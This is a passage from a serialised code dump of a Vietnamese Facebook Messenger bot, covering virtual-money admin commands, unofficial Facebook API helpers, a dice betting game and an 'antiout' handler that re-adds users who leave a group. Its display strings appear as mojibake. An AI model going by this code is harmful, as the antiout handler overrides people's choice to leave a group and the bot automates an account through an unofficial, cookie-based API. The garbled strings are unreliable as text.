/ùòÄùó≤ùòÅùó∫ùóºùóªùó≤ùòÜ ùòÄùó≤ùòÅ  + ùòÄùóºÃÇÃÅ ùòÅùó∂ùó≤ÃÇÃÄùóª : ùòÄùó≤ùòÅ ùó∫ùóºùóªùó≤ùòÜ ùó∞ùóµùóº ùó∞ùóµùó∂ÃÅùóªùóµ ùóØùóÆÃâùóª ùòÅùóµùóÆÃÇùóª\\n‚Üí /ùòÄùó≤ùòÅùó∫ùóºùóªùó≤ùòÜ ùóÆùóπùóπ + ùòÄùóºÃÇÃÅ ùòÅùó∂ùó≤ÃÇÃÄùóª ùòÄùó≤ùòÅ ùó∞ùóµùóº ùòÅùóºùóÆÃÄùóª ùóØùóºÃÇÃ£ ùòÅùóµùóÆÃÄùóªùóµ ùòÉùó∂ùó≤ÃÇùóª ùòÅùóøùóºùóªùó¥ ùóªùóµùóºÃÅùó∫\\n‚Üí /ùòÄùó≤ùòÅùó∫ùóºùóªùó≤ùòÜ ùòÇùó∂ùó± + ùòÇùó∂ùó± ùó∞ùòÇÃâùóÆ ùó∫ùóºÃÇÃ£ùòÅ ùóªùó¥ùòÇÃõùóºÃõÃÄùó∂ ùó±ùòÇÃÄùóªùó¥ ùóªùóÆÃÄùóº ƒëùóºÃÅ ùòÉùóÆÃÄ ùòÄùóºÃÇÃÅ ùòÅùó∂ùó≤ÃÇÃÄùóª ùó∞ùóÆÃÇÃÄùóª ùòÄùó≤ùòÅ\\n‚Üí /ùòÄùó≤ùòÅùó∫ùóºùóªùó≤ùòÜ ùó∞ùóπùó≤ùóÆùóª + ùòÅùóÆùó¥ ùóªùó¥ùòÇÃõùóºÃõÃÄùó∂ ùóØùóÆÃ£ùóª ùó∫ùòÇùóºÃÇÃÅùóª ùòÖùóºùóÆÃÅ ùòÅùóºùóÆÃÄùóª ùóØùóºÃÇÃ£ ùòÄùóºÃÇÃÅ ùòÅùó∂ùó≤ÃÇÃÄùóª\\n‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\\nüíû ùóüùó≤ÃÇÃ£ùóªùóµ ùó±ùóÆÃÄùóªùóµ ùó∞ùóµùóº ùóîùóóùó†ùóúùó° ùóØùóºùòÅ`, event.threadID, event.messageID);\n    const { threadID, messageID, senderID, messageReply } = event;\n\n    const { throwError } = global.utils;\n    const { increaseMoney, decreaseMoney, getData } = Currencies;\n   const mentionID = Object.keys(event.mentions);\n    const money = parseInt(args[1]);\n\n    var message = [];\n    var error = [];\n\n    switch (args[0]) {\n        case \"add\": {\n          if (event.type == \"message_reply\") {\n            var name = (await Users.getData(event.messageReply.senderID)).name;\n          await Currencies.increaseMoney(event.messageReply.senderID, money); console.log(\"done\");\n\n          return api.sendMessage(`[ùêåùê®ùêßùêûùê≤] ùêúùê®Ã£ÃÇùêßùê† ùê≠ùê°ùêöÃÄùêßùê° ùêúùê®ÃÇùêßùê† ${money} ùêúùê°ùê® ${name}` ,event.threadID)      \n\n          } else if (mentionID.length != 0) {\n                for (singleID of mentionID) {\n                if (!money || isNaN(money)) return throwError(this.config.name, threadID, messageID);\n                try {\n                    await Currencies.increaseMoney(singleID, money);\n                    message.push(singleID);\n                } catch (e) { error.push(e); console.log(e) };\n                }\n                return api.sendMessage(`[ùêåùê®ùêßùêûùê≤] ƒêùêöÃÉ ùêúùê®Ã£ÃÇùêßùê† ùê≠ùê°ùêûÃÇùê¶ ${money}$ ùêúùê°ùê® ${message.length} ùêßùê†ùêÆÃõùê®ÃõÃÄùê¢`, threadID, function () { if (error.length != 0) return api.sendMessage(`[ùêåùê®ùêßùêûùê≤] ùêäùê°ùê®ÃÇùêßùê† ùê≠ùê°ùêûÃÇÃâ ùê≠ùê°ùêûÃÇÃâ ùêúùê®Ã£ÃÇùêßùê† ùê≠ùê°ùêûÃÇùê¶ ùê≠ùê¢ùêûÃÇÃÄùêß ùêúùê°ùê® ${error.length} ùêßùê†ùêÆÃõùê®ÃõÃÄùê¢!`, threadID) }, messageID);\n            } else {\n                if (!money || isNaN(money)) return throwError(this.config.name, threadID, messageID);\n                try {\n                await Currencies.increaseMoney(senderID, money);\n                message.push(senderID);\n                } catch (e) { error.push(e) };\n                return api.sendMessage(`[ùêåùê®ùêßùêûùê≤] ƒêùêöÃÉ ùêúùê®Ã£ÃÇùêßùê† ùê≠ùê°ùêûÃÇùê¶ ${money}$ ùêúùê°ùê® ùêõùêöÃâùêß ùê≠ùê°ùêöÃÇùêß`, threadID, function () { if (error.length != 0) return api.sendMessage(`[ùêåùê®ùêßùêûùê≤] ùêäùê°ùê®ÃÇùêßùê† ùê≠ùê°ùêûÃÇÃâ ùê≠ùê°ùêûÃÇÃâ ùêúùê®Ã£ÃÇùêßùê† ùê≠ùê°ùêûÃÇùê¶ ùê≠ùê¢ùêûÃÇÃÄùêß ùêúùê°ùê® ùêõùêöÃâùêß ùê≠ùê°ùêöÃÇùêß`, threadID) }, messageID);\n            }\n        }\n\n        case \"set\": {\n            if (mentionID.length != 0) {\n                for (singleID of mentionID) {\n                if (!money || isNaN(money)) return throwError(this.config.name, threadID, messageID);\n                try {\n                    await Currencies.setData(singleID, { money });\n                    message.push(singleID);\n                } catch (e) { error.push(e) };\n                }\n                return api.sendMessage(`[ùêåùê®ùêßùêûùê≤] ƒêùêöÃÉ ùê¨ùêûùê≠ ùê≠ùê°ùêöÃÄùêßùê° ùêúùê®ÃÇùêßùê† ${money}ùêïùêçƒê ùêúùê°ùê® ${message.length} ùêßùê†ùêÆÃõùê®ÃõÃÄùê¢`, threadID, function () { if (error.length != 0) return api.sendMessage(`[ùêåùê®ùêßùêûùê≤] ùêäùê°ùê®ÃÇùêßùê† ùê≠ùê°ùêûÃÇÃâ ùê¨ùêûùê≠ ùê≠ùê¢ùêûÃÇÃÄùêß ùêúùê°ùê® ${error.length} ùêßùê†ùêÆÃõùê®ÃõÃÄùê¢!`, threadID) }, messageID);\n            } else if (args[2]) {\n                if (!money || isNaN(money)) return throwError(this.config.name, threadID, messageID);\n                try {\n                await Currencies.setData(args[2], { money });\n                message.push(args[2]);\n                } catch (e) { error.push(e) };\n                return api.sendMessage(`[ùêåùê®ùêßùêûùê≤] ƒêùêöÃÉ ùê¨ùêûùê≠ ùê≠ùê°ùêöÃÄùêßùê° ùêúùê®ÃÇùêßùê† ${money}ùêïùêçƒê ùêúùê°ùê® ${message.length} ùêßùê†ùêÆÃõùê®ÃõÃÄùê¢!`, threadID, function () { if (error.length != 0) return api.sendMessage(`[ùêåùê®ùêßùêûùê≤] ùêäùê°ùê®ÃÇùêßùê† ùê≠ùê°ùêûÃÇÃâ ùê¨ùêûùê≠ ùê≠ùê¢ùêûÃÇÃÄùêß ùêúùê°ùê® ${error.length} ùêßùê†ùêÆÃõùê®ÃõÃÄùê¢!`, threadID) }, messageID);\n            }\n            else {\n                if (!money || isNaN(money)) return throwError(this.config.name, threadID, messageID);\n                try {\n                await Currencies.setData(senderID, { money });\n                message.push(senderID);\n                } catch (e) { error.push(e) };\n                return api.sendMessage(`[ùêåùê®ùêßùêûùê≤] ƒêùêöÃÉ ùê¨ùêûùê≠ ùê≠ùê°ùêöÃÄùêßùê° ùêúùê®ÃÇùêßùê† ${money}ùêïùêçƒê ùêúùê°ùê® ùêõùêöÃâùêß ùê≠ùê°ùêöÃÇùêß`, threadID, function () { if (error.length != 0) return api.sendMessage(`[ùêåùê®ùêßùêûùê≤] ùêäùê°ùê®ÃÇùêßùê† ùê≠ùê°ùêûÃÇÃâ ùê¨ùêûùê≠ ùê≠ùê¢ùêûÃÇÃÄùêß ùêúùê°ùê® ùêõùêöÃâùêß ùê≠ùê°ùêöÃÇùêß!`, threadID) }, messageID);\n            }\n        }\n\n        case \"clean\": {\n            if (mentionID.length != 0) {\n                for (singleID of mentionID) {\n                try {\n                    await Currencies.setData(singleID, { money: 0 });\n                    message.push(singleID);\n                } catch (e) { error.push(e) };\n            }\n                return api.sendMessage(`[ùêåùê®ùêßùêûùê≤] ƒêùêöÃÉ ùê±ùê®ÃÅùêö ùê≠ùê°ùêöÃÄùêßùê° ùêúùê®ÃÇùêßùê† ùê≠ùê®ùêöÃÄùêß ùêõùê®Ã£ÃÇ ùê≠ùê¢ùêûÃÇÃÄùêß ùêúùêÆÃâùêö ${message.length} ùêßùê†ùêÆÃõùê®ÃõÃÄùê¢`, threadID, function () { if (error.length != 0) return api.sendMessage(`[ùêåùê®ùêßùêûùê≤]  ùêäùê°ùê®ÃÇùêßùê† ùê≠ùê°ùêûÃÇÃâ ùê±ùê®ÃÅùêö ùê≠ùê®ùêöÃÄùêß ùêõùê®Ã£ÃÇ ùê≠ùê¢ùêûÃÇÃÄùêß ùêúùêÆÃâùêö ${error.length} ùêßùê†ùêÆÃõùê®ÃõÃÄùê¢!`, threadID) }, messageID);\n            } else {\n                try {\n                await Currencies.setData(senderID, { money: 0 });\n                message.push(senderID);\n                } catch (e) { error.push(e) };\n                return api.sendMessage(`[ùêåùê®ùêßùêûùê≤] ƒêùêöÃÉ ùê±ùê®ÃÅùêö ùê≠ùê°ùêöÃÄùêßùê° ùêúùê®ÃÇùêßùê† ùê≠ùê¢ùêûÃÇÃÄùêß ùêúùêÆÃâùêö ùêúùê°ùê® ùêõùêöÃâùêß ùê≠ùê°ùêöÃÇùêß`, threadID, function () { if (error.length != 0) return api.sendMessage(`[ùêåùê®ùêßùêûùê≤]  ùêäùê°ùê®ÃÇùêßùê† ùê≠ùê°ùêûÃÇÃâ ùê±ùê®ÃÅùêö ùê≠ùê®ùêöÃÄùêß ùêõùê®Ã£ÃÇ ùê≠ùê¢ùêûÃÇÃÄùêß ùêúùêÆÃâùêö ùêõùêöÃâùêß ùê≠ùê°ùêöÃÇùêß!`, threadID) }, messageID);\n            }\n        }\n\n        case \"all\": {\n           var name = (await Users.getData(event.senderID)).name\n            if(!args[1]) return api.sendMessage(\"[ùêåùê®ùêßùêûùê≤] ùêÇùê°ùêÆÃõùêö ùêßùê°ùêöÃ£ÃÇùê© ùê¨ùê®ÃÇÃÅ ùê≠ùê¢ùêûÃÇÃÄùêß\", threadID, messageID);\n            if(isNaN(args[1])) return api.sendMessage(\"[ùêåùê®ùêßùêûùê≤] ùêíùê®ÃÇÃÅ ùê≠ùê¢ùêûÃÇÃÄùêß ùê©ùê°ùêöÃâùê¢ ùê•ùêöÃÄ ùê¨ùê®ÃÇÃÅ\", threadID, messageID);\n            if(args[1] > 1000000000) return api.sendMessage(\"[ùêåùê®ùêßùêûùê≤] ùêíùê®ÃÇÃÅ ùê≠ùê¢ùêûÃÇÃÄùêß ùê©ùê°ùêöÃâùê¢ ùêßùê°ùê®Ãâ ùê°ùê®Ãõùêß ùüèùüéùüéùüéùüéùüéùüéùüéùüéùüé\", threadID, messageID);\n            let { participantIDs } = await api.getThreadInfo(threadID);\n            for(let i of participantIDs) {\n                try {\n                    await increaseMoney(parseInt(i), parseInt(args[1]));\n                    message.push(i);\n                } catch(e) { error.push(e) }\n            }\n            return api.sendMessage(`${name} ƒêùêöÃÉ ùêúùê®Ã£ÃÇùêßùê† ùê≠ùê°ùêûÃÇùê¶ ${args[1]}ùêïùêçƒê ùêúùê°ùê® ${message.length} ùêßùê†ùêÆÃõùê®ÃõÃÄùê¢`, threadID, function () { if (error.length != 0) return api.sendMessage(`[ùêåùê®ùêßùêûùê≤] ùêäùê°ùê®ÃÇùêßùê† ùê≠ùê°ùêûÃÇÃâ ùêúùê®Ã£ÃÇùêßùê† ùê≠ùê°ùêûÃÇùê¶ ùê≠ùê¢ùêûÃÇÃÄùêß ùêúùê°ùê® ${error.length} ùêßùê†ùêÆÃõùê®ÃõÃÄùê¢!`, threadID) }, messageID);\n        }\n\n        case \"uid\": {\n           var id = args[1];\n    var cut = args[2];\n    let nameeee = (await Users.getData(id)).name\n       return api.sendMessage(`[ùêåùê®ùêßùêûùê≤] ƒêùêöÃÉ ùêúùê®Ã£ÃÇùêßùê† ùê≠ùê°ùêûÃÇùê¶ ${nameeee} ùê≠ùê°ùêöÃÄùêßùê° ${cut} ùêïùêçƒê`, event.threadID, () => Currencies.increaseMoney(id, parseInt(cut)), event.messageID)\t\n          }\n        default: {\n            return global.utils.throwError(this.config.name, threadID, messageID);\n        }\n    }\n}","path":null,"size_bytes":10219,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/getUserInfoV3.js":{"content":"/* eslint-disable linebreak-style */\n\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n    return function getUserInfoV3(id,full, callback) {\n        if (utils.getType(full) !== \"Boolean\") {\n            throw {error: \"getUserInfoV3: full must be a boolean\"};\n        }\n        var resolveFunc = function () { };\n        var rejectFunc = function () { };\n        var returnPromise = new Promise(function (resolve, reject) {\n            resolveFunc = resolve;\n            rejectFunc = reject;\n        });\n    \n        if (!callback) {\n            callback = function (err, userInfo) {\n            if (err) return rejectFunc(err);\n            resolveFunc(userInfo);\n            };\n        }\n\nvar form = {\n    \"av\": ctx.userID,\n    \"fb_api_caller_class\": \"RelayModern\",\n    \"fb_api_req_friendly_name\": \"ProfileCometTimelineFeedRefetchQuery\",\n    \"variables\": JSON.stringify({ \n        \"id\": String(id) \n    }),\n    \"doc_id\": 5092283120862795\n};\ntry {\n        defaultFuncs\n            .post(\"https://www.facebook.com/api/graphql/\", ctx.jar, form)\n            .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n            .then(function (resData) {\n            if (resData.error) throw resData;\n                switch (full) {\n                    case true:\n                        callback(null, resData[0].data.node.timeline_list_feed_units.edges[0].node);\n                        break;\n                    case false:\n                        callback(null, resData[0].data.node.timeline_list_feed_units.edges[0].node.comet_sections.context_layout.story.comet_sections.actor_photo.story.actors[0]);\n                        break;\n                    default: \n                throw {error: \"getUserInfoV3: full must be a boolean\"};\n                }\n            })\n            .catch(function (err) {\n                log.error(\"getUserInfo\", \"L·ªói: getUserInfo C√≥ Th·ªÉ Do B·∫°n Spam Qu√° Nhi·ªÅu !,H√£y Th·ª≠ L·∫°i !\");\n                return callback(err);\n            });\n    }\n    catch (e) {\n        return callback(null, e);\n    }\n    return returnPromise;\n    };\n};","path":null,"size_bytes":2154,"size_tokens":null},"lib/fca-auto/Func/AcceptAgreement.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\nvar database = require('../Extra/Database');\nmodule.exports = function (defaultFuncs, api, ctx) {\n    return function (args,callback) {\n        var resolveFunc = function () { };\n        var rejectFunc = function () { };\n        var returnPromise = new Promise(function (resolve, reject) {\n            resolveFunc = resolve;\n            rejectFunc = reject;\n        });\n\n        if (!callback) {\n            callback = function (err, data) {\n                if (err) return rejectFunc(err);\n                resolveFunc(data);\n            };\n        }\n            if (database(true).get('agreement') == true) {\n                callback(null, \"Accecpt\");\n            }\n            else {\n                database(true).set('agreement', true);\n                var Form = \"=== Horizon end-user license agreement ===\\n\\n Free to use and edited ‚ú®\";\n                callback(null, Form);\n            }\n        return returnPromise;\n    };\n};\n","path":null,"size_bytes":1014,"size_tokens":null},"modules/events/antiout.js":{"content":"module.exports.config = {\n    name: \"antiout\",\n    eventType: [\"log:unsubscribe\"],\n    version: \"0.0.1\",\n    credits: \"DungUwU\",\n    description: \"Listen events\"\n};\n\nmodule.exports.run = async({ event, api, Threads, Users }) => {\n    let data = (await Threads.getData(event.threadID)).data || {};\n    if (!data.antiout) return;\n    if (event.logMessageData.leftParticipantFbId == api.getCurrentUserID()) return;\n    const name = global.data.userName.get(event.logMessageData.leftParticipantFbId) || await Users.getNameUser(event.logMessageData.leftParticipantFbId);\n    const type = (event.author == event.logMessageData.leftParticipantFbId) ? \"t·ª± r·ªùi\" : \"b·ªã qu·∫£n tr·ªã vi√™n ƒëu·ªïi\";\n    if (type == \"t·ª± r·ªùi\") {\n        api.addUserToGroup(event.logMessageData.leftParticipantFbId, event.threadID, (error, info) => {\n            if (error) {\n                api.sendMessage(`[ANTIOUT] ùêäùê°ùê®ÃÇùêßùê† ùê≠ùê°ùêûÃÇÃâ ùê¶ùê®ÃõÃÄùê¢ ${name} ùêØùêöÃÄùê® ùê•ùêöÃ£ùê¢ ùêßùê°ùê®ÃÅùê¶ `, event.threadID)\n            } else api.sendMessage(`[ANTIOUT] ùêÉùêöÃÉ ùê¶ùê®ÃõÃÄùê¢ ${name} ùêØùêöÃÄùê® ùê•ùêöÃ£ùê¢ ùêßùê°ùê®ÃÅùê¶`, event.threadID);\n        })\n    }\n}","path":null,"size_bytes":1199,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/markAsSeen.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function markAsSeen(seen_timestamp, callback) {\n    if (utils.getType(seen_timestamp) == \"Function\" ||\n      utils.getType(seen_timestamp) == \"AsyncFunction\") {\n      callback = seen_timestamp;\n      seen_timestamp = Date.now();\n    }\n\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err, data) {\n        if (err) return rejectFunc(err);\n\n        resolveFunc(data);\n      };\n    }\n\n    var form = {\n      seen_timestamp: seen_timestamp\n    };\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/ajax/mercury/mark_seen.php\", ctx.jar, form)\n      .then(utils.saveCookies(ctx.jar))\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (resData.error) throw resData;\n\n        return callback();\n      })\n      .catch(function (err) {\n        log.error(\"markAsSeen\", err);\n        if (utils.getType(err) == \"Object\" && err.error === \"Not logged in.\") ctx.loggedIn = false;\n\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1343,"size_tokens":null},"modules/commands/baucua.js":{"content":" var request = require(\"request\");const { readdirSync, readFileSync, writeFileSync, existsSync, copySync, createWriteStream, createReadStream } = require(\"fs-extra\");\n    module.exports.config = {\n        name: \"baucua\",\n        version: \"1.0.0\",\n        hasPermssion: 0,\n        credits: \"Horizon Lucius Synthesis I\",\n        description: \"Game b·∫ßu cua c√≥ ƒë·∫∑t c∆∞·ª£c\",\n        commandCategory: \"Tr√≤ Ch∆°i\",\n        usages: \"#baucua ùê†ùêöÃÄ/ùê≠ùê®ÃÇùê¶/ùêõùêöÃÇÃÄùêÆ/ùêúùêÆùêö/ùêúùêöÃÅ/ùêßùêöùê¢] ùê°ùê®ùêöÃ£ÃÜùêú [üêì/ü¶û/üçê/ü¶Ä/üê¨/ü¶å] ùêíùê®ÃÇÃÅ ùê≠ùê¢ùêûÃÇÃÄùêß ùêúùêÆÃõùê®ÃõÃ£ùêú (ùê•ùêÆÃõùêÆ ùê≤ÃÅ ùê©ùê°ùêöÃâùê¢ ùê≠ùê´ùêûÃÇùêß ùüèùüéùüé$) l·∫Øc ra x1 x1.5$, x2 x2$, x3 x3$\",\n        cooldowns: 2\n    };\n\n    module.exports.onLoad = async function () {\n        if (!existsSync(__dirname + '/cache/·∫£nh/ga.jpg')) {\n            request('https://i.imgur.com/Vz17qhg.jpg').pipe(createWriteStream(__dirname + '/cache/ga.jpg'));\n        }\n        if (!existsSync(__dirname + '/cache/·∫£nh/tom.jpg')) {\n            request('https://i.imgur.com/Ep0MukF.jpg').pipe(createWriteStream(__dirname + '/cache/tom.jpg'));\n        }\n        if (!existsSync(__dirname + '/cache/·∫£nh/bau.jpg')) {\n            request('https://i.imgur.com/Qp3StfB.jpg').pipe(createWriteStream(__dirname + '/cache/bau.jpg'));\n        }\n        if (!existsSync(__dirname + '/cache/·∫£nh/cua.jpg')) {\n            request('https://i.imgur.com/J5MPPMW.jpg').pipe(createWriteStream(__dirname + '/cache/cua.jpg'));\n        }\n        if (!existsSync(__dirname + '/cache/·∫£nh/ca.jpg')) {\n            request('https://i.imgur.com/JNQr0qI.jpg').pipe(createWriteStream(__dirname + '/cache/ca.jpg'));\n        }\n        if (!existsSync(__dirname + '/cache/·∫£nh/nai.jpg')) {\n            request('https://i.imgur.com/UYhUZf8.jpg').pipe(createWriteStream(__dirname + '/cache/nai.jpg'));\n        }\n        if (!existsSync(__dirname + '/cache/·∫£nh/baucua.gif')) {\n            request('https://i.imgur.com/dlrQjRL.gif').pipe(createWriteStream(__dirname + '/cache/·∫£nh/baucua.gif'));\n        }\n    };\n\n    async function get(one,two,three) {\n        var x1;\n            switch (one) {\n                case \"ga\": x1 = \"üêì\";\n                    break;\n                case \"tom\": x1 = 'ü¶û';\n                    break;\n                case \"bau\": x1 = 'üçê';\n                    break;\n                case \"cua\": x1 = 'ü¶Ä';\n                    break;\n                case \"ca\": x1 = 'üê¨';\n                    break;\n                case \"nai\":x1 = 'ü¶å';\n            }\n        var x2;\n            switch (two) {\n                case \"ga\": x2 = \"üêì\";\n                    break;\n                case \"tom\": x2 = 'ü¶û';\n                    break;\n                case \"bau\": x2 = 'üçê';\n                    break;\n                case \"cua\": x2 = 'ü¶Ä';\n                    break;\n                case \"ca\": x2 = 'üê¨';\n                    break;\n                case \"nai\": x2 = 'ü¶å';\n            }\n        var x3;\n            switch (three) {\n                case \"ga\": x3 = \"üêì\";\n                    break;\n                case \"tom\": x3 = 'ü¶û';\n                    break;\n                case \"bau\": x3 = 'üçê';\n                    break;\n                case \"cua\": x3 = 'ü¶Ä';\n                    break;\n                case \"ca\": x3 = 'üê¨';\n                    break;\n                case \"nai\":x3 = 'ü¶å';\n            }\n        var all = [x1, x2, x3];\n    return full = all;\n    }\nvar full = [];\n    module.exports.run = async function({ api, event, args, Currencies }) { var out = (msg) => api.sendMessage(msg,event.threadID, event.messageID);\n        const slotItems = [\"ga\", \"tom\", \"bau\", \"cua\", \"ca\", \"nai\"];\n            const moneyUser = (await Currencies.getData(event.senderID)).money;\n                var moneyBet = parseInt(args[1]);\n                    if (!args[0] || !isNaN(args[0])) return api.sendMessage(\"ùêÇùêöÃÅùêúùê° ùêúùê°ùê®Ãõùê¢ : #ùêõùêöùêÆùêúùêÆùêö [ùêõùêöÃÇÃÄùêÆ/ùêúùêÆùêö/ùêúùêöÃÅ/ùêßùêöùê¢/ùê†ùêöÃÄ/ùê≠ùê®ÃÇùê¶] [ùê¨ùê®ÃÇÃÅ ùê≠ùê¢ùêûÃÇÃÄùêß]\",event.threadID, event.messageID);\n                    if (isNaN(moneyBet) || moneyBet <= 0) return api.sendMessage(\"ùêíùê®ÃÇÃÅ ùê≠ùê¢ùêûÃÇÃÄùêß ùêùùêöÃ£ÃÜùê≠ ùêúùêÆÃõùê®ÃõÃ£ùêú ùê§ùê°ùê®ÃÇùêßùê† ùêùùêÆÃõùê®ÃõÃ£ùêú ùêùùêûÃÇÃâ ùê≠ùê´ùê®ÃÇÃÅùêßùê† ùê°ùê®ùêöÃ£ÃÜùêú ùê•ùêöÃÄ ùê¨ùê®ÃÇÃÅ ùê≠ùê¢ùêûÃÇÃÄùêß ùêöÃÇùê¶\", event.threadID, event.messageID);\n                if (moneyBet > moneyUser) return api.sendMessage(\"ùêíùê®ÃÇÃÅ ùê≠ùê¢ùêûÃÇÃÄùêß ùêõùêöÃ£ùêß ùêùùêöÃ£ÃÜùê≠ ùê•ùê®ÃõÃÅùêß ùê°ùê®Ãõùêß ùê¨ùê®ÃÇÃÅ ùêùùêÆÃõ ùêúùêÆÃâùêö ùêõùêöÃ£ùêß!\", event.threadID, event.messageID);\n            if (moneyBet < 100) return api.sendMessage(\"ùêíùê®ÃÇÃÅ ùê≠ùê¢ùêûÃÇÃÄùêß ùêùùêöÃ£ÃÜùê≠ ùê§ùê°ùê®ÃÇùêßùê† ùêùùêÆÃõùê®ÃõÃ£ùêú ùêùùêÆÃõùê®ÃõÃÅùê¢ ùüèùüéùüé$!\", event.threadID, event.messageID);\n        var number = [], win = false;\n    for (let i = 0; i < 3; i++) number[i] = slotItems[Math.floor(Math.random() * slotItems.length)];\n        var itemm;\n            var icon;\n                switch (args[0]) {\n                    case \"b·∫ßu\":\n                        case \"B·∫ßu\": itemm = \"bau\";\n                                icon = 'üçê';\n                            break;\n                    case \"cua\": \n                        case \"Cua\": itemm = \"cua\";\n                                icon = 'ü¶Ä';\n                            break;\n                    case \"c√°\":\n                        case \"C√°\": itemm = \"ca\";\n                                icon = 'üêü';\n                            break;\n                    case \"nai\":\n                        case \"Nai\": itemm = \"nai\";\n                                icon = 'ü¶å';\n                            break;\n                    case \"g√†\": \n                        case \"G√†\": itemm = \"ga\";\n                                icon = 'üêì';\n                            break;\n                    case \"t√¥m\":\n                        case \"T√¥m\": itemm = \"tom\";\n                                icon = 'ü¶û';\n                            break;\n                                default: return api.sendMessage(\"ùêÇùêöÃÅùêúùê° ùêúùê°ùê®Ãõùê¢ : #ùêõùêöùêÆùêúùêÆùêö [ùêõùêöÃÇÃÄùêÆ/ùêúùêÆùêö/ùêúùêöÃÅ/ùêßùêöùê¢/ùê†ùêöÃÄ/ùê≠ùê®ÃÇùê¶] [ùê¨ùê®ÃÇÃÅ ùê≠ùê¢ùêûÃÇÃÄùêß]\",event.threadID, event.messageID);\n                }      \n                await get(number[0],number[1],number[2]);\n            api.sendMessage({body:\"ùêÇùê°ùê®ÃõÃÄ ùêõùê®ùê≠ ùê•ùêöÃÜÃÅùêú ùêúùê°ùêÆÃÅùêú ùêõùêöÃ£ùêß ùê¶ùêöùê≤ ùê¶ùêöÃÜÃÅùêßüçÄ\",attachment: createReadStream(__dirname + \"/cache/·∫£nh/baucua.gif\")},event.threadID,async (error,info) => {\n                await new Promise(resolve => setTimeout(resolve, 5 * 1000));\n                    api.unsendMessage(info.messageID);\n                          await new Promise(resolve => setTimeout(resolve, 100));\n    var array = [number[0],number[1],number[2]];\n        var listimg = [];\n           for (let string of array) {\n               listimg.push(createReadStream(__dirname + `/cache/·∫£nh/${string}.jpg`));\n           }\n        if (array.includes(itemm)) {\n            var i = 0;\n                if (array[0] == itemm) i+=1;\n                    if (array[1] == itemm) i+=1;\n                if (array[2] == itemm) i+=1;\n            if (i == 1) {\n                var mon = parseInt(args[1]) * 1;  \n                    await Currencies.increaseMoney(event.senderID, mon); console.log(\"s1\")\n                        return api.sendMessage({body:`ùêäùêûÃÇÃÅùê≠ ùê™ùêÆùêöÃâ: ${full.join(\" | \")}\\nùêÅùêöÃ£ùêß ùê≠ùê°ùêöÃÜÃÅùêßùê† ùêØùêöÃÄ ùêßùê°ùêöÃ£ÃÇùêß ùêØùêûÃÇÃÄ ùê¨ùê®ÃÇÃÅ ùê≠ùê¢ùêûÃÇÃÄùêß ${mon}$ \\n‚û¢ ùêÅùê®ùê≠ ùê•ùêöÃÜÃÅùêú ùê´ùêö ùê¶ùê®Ã£ÃÇùê≠ ùêúùê®ùêß ${icon}`,attachment: listimg},event.threadID, event.messageID);\n            }\n            else if (i == 2) {\n                var mon = parseInt(args[1]) * 2; \n                    await Currencies.increaseMoney(event.senderID, mon); console.log(\"s2\")\n                        return api.sendMessage({body:`ùêäùêûÃÇÃÅùê≠ ùê™ùêÆùêöÃâ: ${full.join(\" | \")}\\nùêÅùêöÃ£ùêß ùê≠ùê°ùêöÃÜÃÅùêßùê† ùêØùêöÃÄ ùêßùê°ùêöÃ£ÃÇùêß ùêØùêûÃÇÃÄ ùê¨ùê®ÃÇÃÅ ùê≠ùê¢ùêûÃÇÃÄùêß ${mon}$ \\n‚û¢ ùêÅùê®ùê≠ ùê•ùêöÃÜÃÅùêú ùê´ùêö ùê°ùêöùê¢ ùêúùê®ùêß ${icon}`,attachment: listimg},event.threadID, event.messageID);\n            }\n            else if (i == 3) {\n                var mon = parseInt(args[1]) * 5; \n                    await Currencies.increaseMoney(event.senderID, mon); console.log('s3')\n                        return api.sendMessage({body:`ùêäùêûÃÇÃÅùê≠ ùê™ùêÆùêöÃâ: ${full.join(\" | \")}\\nùêÅùêöÃ£ùêß ùê≠ùê°ùêöÃÜÃÅùêßùê† ùêØùêöÃÄ ùêßùê°ùêöÃ£ÃÇùêß ùêØùêûÃÇÃÄ ùê¨ùê®ÃÇÃÅ ùê≠ùê¢ùêûÃÇÃÄùêß ${mon}$ \\n‚û¢ ùêÅùê®ùê≠ ùê•ùêöÃÜÃÅùêú ùê´ùêö ùêõùêö ùêúùê®ùêß ${icon}`,attachment: listimg},event.threadID, event.messageID);\n            }\n            else return api.sendMessage(\"ùêãùê®ùê¢ ùê´ùê®ùê¢ ùêõùêöùêÆ ùêúùêÆùêö ùêúùê®ùêß ùêúùêöùêú\",event.threadID,event.messageID);\n        } else  {\n            await Currencies.decreaseMoney(event.senderID, parseInt(args[1])); console.log('s4')\n            return api.sendMessage({body:`ùêäùêûÃÇÃÅùê≠ ùê™ùêÆùêöÃâ: ${full.join(\" | \")}\\nùêÅùêöÃ£ùêß ùêùùêöÃÉ ùêõùê¢Ã£ ùê≠ùê°ùêÆùêö ùêØùêöÃÄ ùê≠ùê´ùêÆÃõÃÄ  ${args[1]}$ üí∏\\nùêØùê¢ÃÄ ùê§ùê°ùê®ÃÇùêßùê† ùêúùê®ÃÅ ùêúùê®ùêß ${icon}`,attachment: listimg},event.threadID, event.messageID);\n        }\n            } ,event.messageID);\n    };","path":null,"size_bytes":9785,"size_tokens":null},"modules/commands/acp.js":{"content":"module.exports.config = {\n  name: \"acp\",\n  version: \"1.0.0\",\n  hasPermssion: 2,\n  credits: \"NTKhang\",\n  description: \"K·∫øt b·∫°n qua id Facebook\",\n  commandCategory: \"H·ªá Th·ªëng\",\n  usages: \"accept\",\n  cooldowns: 